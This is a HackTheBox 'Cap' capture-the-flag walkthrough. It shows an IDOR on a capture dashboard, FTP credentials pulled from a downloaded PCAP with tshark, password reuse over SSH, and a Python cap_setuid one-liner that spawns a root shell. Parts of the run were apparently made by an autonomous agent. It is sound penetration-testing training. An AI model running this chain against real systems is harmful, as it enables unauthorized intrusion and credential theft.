---
tags: [HTB, Cap, Linux, Gunicorn, IDOR, PCAP, FTP, CredentialReuse, SSH, Capabilities, Easy]
platform: HackTheBox
os: Linux, Ubuntu 20.04.2 LTS
hostname: cap
difficulty: Easy
ip: $BoxIP
status: Complete
domain: cap.htb
---

# HTB: Cap, Full Walkthrough

## The gist

Cap is an easy Linux box built around two small but important failures. A Gunicorn Security Dashboard exposes capture identifiers without checking whether the requester owns them. The predictable `/data/0` entry leads to a downloadable PCAP containing an FTP login in clear text. The recovered credential is reused for SSH as `nathan`.

The local escalation is a Linux file-capability mistake rather than a SUID or sudo issue. `/usr/bin/python3.8` has `cap_setuid`, allowing Python to change its process UID to 0. Calling `os.setuid(0)` therefore gives a root shell without a password, SUID bit, or kernel exploit.

Attack chain:

~~~text
Full TCP scan
  -> FTP, SSH, and Gunicorn Security Dashboard
  -> predictable /data/<id> capture reference
  -> IDOR to /data/0 and /download/0
  -> FTP USER/PASS recovered from the PCAP
  -> password reuse for SSH as nathan
  -> getcap finds cap_setuid on /usr/bin/python3.8
  -> os.setuid(0)
  -> root shell and both proof files
~~~

> [!warning] Evidence boundary
> The private workspaces contain the complete command/output records, PCAP, extracted FTP authentication, credentials, flags, and manual screenshots. This page deliberately keeps passwords and flag values out of the vault. The private loot remains authoritative.

## Box information

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Operating system | Ubuntu 20.04.2 LTS, kernel 5.4.0-80-generic |
| Hostname | cap |
| Target | `$BoxIP` |
| Domain | cap.htb |
| Difficulty | Easy |
| Initial access | IDOR exposing a PCAP with plaintext FTP credentials |
| Foothold identity | `nathan` over SSH |
| Privilege path | `cap_setuid` on `/usr/bin/python3.8` |
| Final proof | UID 0 root shell and private flag collection |

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | FTP, SSH, and HTTP were exposed | Full TCP and service scans |
| 2 | The dashboard accepted predictable capture IDs without ownership checks | `/data/0` returned another capture while `/data/1` redirected and was empty |
| 3 | The capture download endpoint was unauthenticated | `/download/0` returned the non-empty PCAP |
| 4 | FTP authentication was visible in clear text inside the PCAP | `tshark` FTP request fields |
| 5 | The recovered credential was reused for SSH | Successful SSH validation as `nathan` |
| 6 | Python had `cap_setuid` | `getcap -r /` returned `/usr/bin/python3.8` |

## Evidence and loot

The manual source workspace is:

`/home/kali/Platforms/HackTheBox/Cap/`

The autonomous evidence workspace is:

`/tmp/codex_Cap-10-129-1-102-20260915/`

The autonomous runner recorded 65 numbered commands with separate stdout, stderr, and metadata files. The manual `Cap.log` contains the tutor walkthrough. No screenshots or PNGs were copied into this vault.

| Evidence | Private location |
|---|---|
| Full TCP and service scans | `$BoxDir/nmap/` |
| Manual walkthrough log | `/home/kali/Platforms/HackTheBox/Cap/Cap.log` |
| IDOR pages and HTTP responses | `$BoxDir/loot/page-*.html`, `$BoxDir/loot/http-root.response` |
| Downloaded packet captures | `$BoxDir/loot/capture-0.pcap`, `$BoxDir/loot/capture-1.pcap` |
| FTP authentication extraction | `$BoxDir/loot/capture-0.ftp-auth.raw` |
| Recovered credential | `$BoxDir/loot/credentials.txt` and `creds.txt` |
| User and root proof | `$BoxDir/loot/user.txt`, `$BoxDir/loot/root.txt`, and `flags.txt` |
| Capability helper and LinPEAS copy | `$BoxDir/exploits/` |
| Numbered command replay | `$BoxDir/command-index.log`, `$BoxDir/commands/`, `$BoxDir/outputs/` |
| Full autonomous transcript | `$BoxDir/transcript.log` |
| Integrity manifest | `$BoxDir/notes/artifact-sha256.log` |
| Manual screenshots | `/home/kali/Platforms/HackTheBox/Cap/screenshots/` |

## Variables

Keep recovered values in the private environment and loot files. Do not paste them into the write-up.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Cap
boxset BoxIP $BoxIP
boxset Domain cap.htb
boxset FQDN cap.htb
boxset WebPort 80
boxset Port 4444
boxset Username nathan
boxset Password $Password
~~~

For a manual replay, load the private values only after recording them with the loot helper:

~~~bash
source "$BoxDir/.env"
~~~

> [!warning] Variable discipline
> The commands below use `$BoxIP`, `$BoxDir`, `$Username`, `$Password`, and `$LocalIP`. The credential and flag values are intentionally not reproduced here.

## 1. Initialise the session and preserve evidence

Set up the workspace and target name before reconnaissance. The host name is useful for web requests, but the IP remains the authoritative scan target.

~~~bash
boxstart $BoxName $BoxIP htb
htblog
boxset BoxName Cap
boxset BoxIP $BoxIP
boxset Domain cap.htb
boxset FQDN cap.htb
boxset WebPort 80
boxset Port 4444
~~~

Add the host mapping if it is not already present:

~~~bash
printf '%s\n' "$BoxIP cap.htb" | sudo tee -a /etc/hosts
getent hosts cap.htb
~~~

SCREENSHOT: `box-started` -- private manual evidence showing the prepared Cap workspace.

## 2. Discover every TCP port

The first scan covered all TCP ports. `-sT` uses a TCP connect scan, which is useful when raw packet privileges are unavailable. `-Pn` avoids relying on ICMP discovery, `-n` avoids DNS lookups, and `-oA` preserves normal, grepable, and XML output.

~~~bash
nmap -Pn -n -sT -p- -oA "$BoxDir/nmap/allports" "$BoxIP"
~~~

The scan found only three open TCP ports:

| Port | Service |
|---|---|
| 21/tcp | FTP |
| 22/tcp | SSH |
| 80/tcp | HTTP |

SCREENSHOT: `nmap-allports` -- red: all open ports; green: the complete-port scan context.

## 3. Identify the services

Run a focused service scan against the discovered ports. Version detection immediately showed the web application was Gunicorn rather than Apache or Nginx.

~~~bash
nmap -Pn -n -sT -sC -sV -p 21,22,80 \
  -oA "$BoxDir/nmap/services" "$BoxIP"
~~~

Important results:

~~~text
21/tcp open  ftp  vsftpd 3.0.3
22/tcp open  ssh  OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http Gunicorn
                     Security Dashboard
~~~

The FTP service was tested for anonymous access, but it returned `530 Access denied`. That left SSH and the dashboard as the useful branches. The FTP banner was still relevant because a later packet capture might contain FTP traffic.

SCREENSHOT: `nmap-services` -- red: service versions; green: the Gunicorn Security Dashboard title.

## 4. Inspect the dashboard before brute forcing

Start with the root page and follow its links. The dashboard exposed capture management functionality, including a capture page and predictable data references.

~~~bash
curl -i "http://cap.htb/" | tee "$BoxDir/loot/http-root.response"
curl -i "http://cap.htb/capture"
curl -i "http://cap.htb/data/0"
curl -i "http://cap.htb/data/1"
~~~

The root HTML contained links for `/capture`, `/ip`, and `/netstat`. `/capture` redirected to `/data/1`; `/data/1` redirected back to the dashboard and did not contain a useful capture. `/data/0` returned a capture record with a download button pointing to `/download/0`.

This is the point where the IDOR becomes visible: an integer reference is accepted directly, and there is no ownership check tying the record to the current user.

SCREENSHOT: `idor-finding` -- red: `/data/0` and its download action; green: the difference between the valid non-empty record and `/data/1`.

> [!abstract] 🧠 Why
> A `200` response is not enough to establish an IDOR. Compare neighbouring identifiers, follow the download action, and check whether the returned object belongs to the current session. Here the endpoint accepted a predictable ID and exposed a non-empty capture without authentication.

## 5. Download and analyse the capture

Download the non-empty capture and save the response headers separately. Keep the capture in private loot because packet contents may contain credentials.

~~~bash
curl -sS -D "$BoxDir/loot/download-0.headers" \
  -o "$BoxDir/loot/capture-0.pcap" \
  "http://cap.htb/download/0"

file "$BoxDir/loot/capture-0.pcap"
capinfos "$BoxDir/loot/capture-0.pcap"
~~~

The download was approximately 9.8 KB and contained HTTP and FTP traffic. The neighbouring `/data/1` capture was empty, which is why repeatedly analysing ID 1 produced no useful result.

First identify the protocols and streams:

~~~bash
tshark -r "$BoxDir/loot/capture-0.pcap" \
  -T fields -e frame.number -e ip.src -e ip.dst \
  -e tcp.srcport -e tcp.dstport -e _ws.col.Protocol \
  > "$BoxDir/loot/capture-0.packet-index.txt"

tshark -r "$BoxDir/loot/capture-0.pcap" -q -z conv,tcp \
  > "$BoxDir/loot/capture-0.streams.txt"
~~~

The FTP protocol is the important lead. Extract only the FTP authentication fields into private loot instead of printing the credential to the terminal transcript:

~~~bash
tshark -r "$BoxDir/loot/capture-0.pcap" \
  -Y 'ftp.request.command == "USER" || ftp.request.command == "PASS"' \
  -T fields -e ftp.request.command -e ftp.request.arg \
  > "$BoxDir/loot/capture-0.ftp-auth.raw"
chmod 600 "$BoxDir/loot/capture-0.ftp-auth.raw"
~~~

The extraction returned the `nathan` username and a plaintext password. Store it privately and set the standard variables without reproducing the value in the note:

~~~bash
loot cred nathan "$Password"
boxset Username nathan
boxset Password "$Password"
~~~

SCREENSHOT: `creds-found` -- red: FTP `USER`/`PASS` fields and their source capture; green: the private credential-storage workflow. Do not expose the password in a vault screenshot.

> [!warning] Common mistake
> Seeing FTP open on port 21 does not mean anonymous FTP will work, and seeing an empty capture does not mean the download path is useless. The live FTP service was denied; the dashboard PCAP contained the useful FTP exchange.

## 6. Validate the credential over SSH

The recovered credential is now a candidate for password reuse. Validate it against SSH with the username, rather than spraying it blindly across unrelated accounts.

~~~bash
ssh "$Username@$BoxIP"
~~~

The login succeeded as `nathan`. Confirm the account and host before local enumeration:

~~~bash
id
whoami
hostname
pwd
uname -a
cat /etc/os-release
~~~

The foothold was an Ubuntu 20.04.2 LTS system with a 5.4.0-80-generic kernel. The shell was stable SSH, so a reverse-shell upgrade was unnecessary.

SCREENSHOT: `foothold` -- red: `nathan` identity; green: host and working-directory context.

## 7. Run standard local privilege checks

Check sudo, SUID files, and Linux capabilities. The important distinction on this box is that the escalation is not visible in `sudo -l` and does not require a SUID binary.

~~~bash
sudo -l
find / -type f -perm -4000 -printf '%m %u %p\n' 2>/dev/null
getcap -r / 2>/dev/null
~~~

`sudo -l` did not provide a useful rule. The capability search returned:

~~~text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
~~~

`cap_setuid` is the decisive capability. A process with this capability can call `setuid(0)` and change its UID to root. The interpreter does not need to be SUID, and no password is required.

SCREENSHOT: `privesc-finding` -- red: `/usr/bin/python3.8` and `cap_setuid`; green: the surrounding `getcap` result.

> [!abstract] 🧠 Why
> File capabilities are an alternative privilege boundary. A normal file mode listing can look harmless while the capability metadata grants a powerful operation. Always include `getcap -r / 2>/dev/null` in Linux local enumeration.

## 8. Confirm the capability exploit

Use the capable Python interpreter to set the process UID to 0 and launch Bash. This is a direct proof of the finding and does not rely on a kernel exploit or an external framework.

~~~bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
~~~

Confirm the resulting identity:

~~~bash
id
whoami
hostname
~~~

The resulting shell was root. The original process started as `nathan`, but the effective UID changed because Python had `cap_setuid`.

SCREENSHOT: `root-shell` -- red: UID 0 and `root`; green: hostname context.

## 9. Collect both proof files privately

Read the user and root proof files from the root shell. Store the values with the loot helper rather than placing them in the transcript or vault note.

~~~bash
cat /home/nathan/user.txt
cat /root/root.txt
loot flag user "$UserFlag"
loot flag root "$RootFlag"
chmod 600 "$BoxDir/loot/user.txt" "$BoxDir/loot/root.txt" "$BoxDir/loot/flags.txt"
~~~

The user proof is at `/home/nathan/user.txt` and the root proof is at `/root/root.txt`. Both values were confirmed and are retained only in private loot.

SCREENSHOT: `user-flag` -- private manual evidence of the user proof collection.

The checked manual workspace contains the root-shell evidence but no file named `root-flag.png`; the EE audit records that screenshot discrepancy. The root value itself is present in private loot.

## 10. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| FTP anonymous login returns `530` | Continue with HTTP and keep FTP as a packet-analysis lead | Test only documented FTP functionality; do not brute force without scope |
| Dashboard accepts `/data/<id>` | Compare IDs and follow the download endpoint | Inspect all linked endpoints and response redirects |
| `/data/1` is empty | Test neighbouring IDs, especially `/data/0` | Use the dashboard HTML and HTTP status/length differences |
| PCAP contains FTP traffic | Extract `USER` and `PASS` with `tshark` | Follow the TCP stream in Wireshark or inspect FTP fields manually |
| SSH credential works as `nathan` | Move to stable SSH and begin local enumeration | Use `nxc` for controlled validation if an interactive SSH client is unavailable |
| `sudo -l` and SUID do not solve escalation | Run `getcap -r /` and inspect interpreters | Check cron, services, writable files, and kernel exposure |
| Python has `cap_setuid` | Call `os.setuid(0)` and verify UID 0 | Use a short uploaded Python helper if quoting is awkward |

## 11. Vulnerabilities and techniques

| Technique | Description | Impact |
|---|---|---|
| IDOR | Predictable capture IDs were accepted without an ownership check | Access to another user's PCAP |
| Plaintext credential exposure | FTP `USER` and `PASS` values were visible in the capture | Recovered SSH credential |
| Password reuse | The FTP credential also authenticated to SSH | Stable foothold as `nathan` |
| Linux file capability abuse | `cap_setuid` was assigned to Python 3.8 | Root shell via `os.setuid(0)` |

## 12. RUNBOOK V2 stages used

- [[OSCP/RUNBOOK V2/Start Here]] -- workspace, scope, and evidence discipline
- [[OSCP/RUNBOOK V2/Port Triage]] -- complete TCP discovery before choosing a service
- [[OSCP/RUNBOOK V2/Linux - Service Scan]] -- version and application identification
- [[OSCP/RUNBOOK V2/Linux - FTP Enumeration]] -- anonymous FTP validation and service triage
- [[OSCP/RUNBOOK V2/Linux - Web Enum]] -- dashboard mapping, redirects, and IDOR comparison
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]] -- shell handling reference, although SSH provided a stable shell here
- [[OSCP/RUNBOOK V2/Linux - Local Enum]] -- identity and local privilege enumeration
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]] -- sudo boundary check and documented dead end
- [[OSCP/RUNBOOK V2/Linux - Clean Down]] -- removal and verification of staged artifacts

The dedicated gaps identified during this run are now covered by [[OSCP/RUNBOOK V2/Linux - IDOR and PCAP Credential Recovery|Linux - IDOR and PCAP Credential Recovery]] and [[OSCP/RUNBOOK V2/Linux - File Capabilities|Linux - File Capabilities]]. This write-up remains the evidence-backed case study; the reusable command routes now live in those runbooks.

## 13. Collect and protect the evidence

The private workspaces contain flags, credentials, capture data, and command output. Keep them outside the write-up vault and preserve the numbered replay trail.

~~~bash
find "$BoxDir/loot" -type f -exec chmod 600 {} +
find "$BoxDir/commands" -type f -name '*.cmd' | sort
find "$BoxDir/outputs" -type f -name '*.log' | sort
sed -n '1,240p' "$BoxDir/command-index.log"
~~~

The autonomous run also recorded failed setup and enumeration steps, including the initial shell-initialisation issue, the missing medium SecLists wordlist, the empty capture, the failed first user-flag copy, and the root-owned temporary-file cleanup. These failures are useful evidence and remain in the private transcript.

## 14. Clean down

Remove target-side staging files, restore temporary host configuration, protect private loot, and verify the target is clean. The autonomous run removed the uploaded LinPEAS and Python helper files, removed the root-owned temporary evidence file using the capability, and restored `/etc/hosts`.

~~~bash
rm -f /tmp/linpeas-cap.sh /tmp/cap-root.py /tmp/cap-user.txt /tmp/cap-root.txt
grep -q 'cap.htb' /etc/hosts && sudo sed -i "\\|$BoxIP cap.htb|d" /etc/hosts || true
find "$BoxDir/loot" -type f -exec chmod 600 {} +
boxdone
~~~

Final verification reported no remaining staged files on the target. The manual workspace retains the private evidence needed for review.

## 15. Attack narrative in one page

1. [[OSCP/RUNBOOK V2/Port Triage]] found FTP, SSH, and HTTP.
2. [[OSCP/RUNBOOK V2/Linux - Web Enum]] mapped the Security Dashboard and compared predictable capture IDs.
3. The IDOR exposed `/data/0`, and `/download/0` returned a non-empty PCAP.
4. `tshark` extracted FTP authentication from the capture; the credential was reused for SSH as `nathan`.
5. [[OSCP/RUNBOOK V2/Linux - Local Enum]] and `getcap` found `cap_setuid` on Python 3.8.
6. `os.setuid(0)` produced a root shell, allowing both proof files to be collected privately.

## Tools used

| Tool | Purpose |
|---|---|
| `nmap` | Full TCP and service/version scanning |
| `curl` | Dashboard, capture ID, and download enumeration |
| `gobuster` | Common web-content discovery after the default wordlist path was unavailable |
| `tshark` | PCAP protocol and FTP credential extraction |
| `capinfos` | PCAP metadata inspection |
| `ssh` | Credential validation and stable foothold |
| `getcap` | Linux file-capability enumeration |
| `linpeas` | Supporting local enumeration |
| `python3.8` | Capability-based UID change to root |

## Credentials and secrets

| Username | Password | Source | Used for |
|---|---|---|---|
| `nathan` | `$Password` | FTP authentication inside the IDOR-exposed PCAP | SSH foothold |

The password and flags remain in private loot only.

## Lessons learned and vault links

1. **Enumerate the application object, not only the page.** The dashboard's `/data/<id>` route was more important than the landing page. Predictable object references deserve comparison with neighbouring IDs.

2. **A redirect can hide the useful branch.** `/data/1` redirected back to the dashboard and was empty. That did not invalidate the capture feature; it made testing `/data/0` more important.

3. **A closed credential channel can still be an open evidence source.** Live anonymous FTP returned `530`, but FTP traffic inside the downloaded PCAP exposed the useful authentication exchange.

4. **Treat packet captures as sensitive loot.** PCAPs can contain credentials, cookies, tokens, and complete application traffic. Save them privately and analyse fields or streams deliberately.

5. **Password reuse is a validation step, not a conclusion.** The FTP credential was tested against SSH for the same user and produced a real foothold. It was not sprayed indiscriminately.

6. **Always check capabilities.** `sudo -l` and SUID checks did not reveal the route. `getcap -r /` exposed a capable interpreter, and `cap_setuid` mapped directly to `os.setuid(0)`.

7. **Target-side cleanup can require the same privilege path.** The root-owned temporary evidence file could not be removed by `nathan`; the capability was used to remove it, and a fresh check confirmed cleanup.

8. **Keep the dead ends.** Anonymous FTP, the empty capture, the unavailable medium wordlist, and the first failed user-flag retrieval explain why the final route was selected and are preserved in the private transcript.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Management|Management]] -- application secrets and a non-obvious Linux privilege boundary.
- [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- web enumeration followed by focused local escalation.
- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- stable Linux foothold followed by local privilege enumeration.
- [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- web access and Linux local privilege escalation.

## External resources

| Resource | Link | Why |
|---|---|---|
| HackTricks - IDOR | https://book.hacktricks.xyz/pentesting-web/idor | Object-reference testing methodology |
| Wireshark Display Filters | https://wiki.wireshark.org/DisplayFilters | PCAP field and protocol filtering |
| GTFOBins - Python | https://gtfobins.github.io/gtfobins/python/ | Python privilege-boundary reference |
| Linux capabilities | https://man7.org/linux/man-pages/man7/capabilities.7.html | Capability semantics and `CAP_SETUID` |

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - FTP Enumeration]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

Cap compresses several exam habits into a short chain: enumerate object references instead of trusting the visible page, treat packet captures as credential-bearing files, validate password reuse in a controlled way, and include Linux capabilities in every local privilege checklist. The box is easy only when each small evidence source is followed carefully.
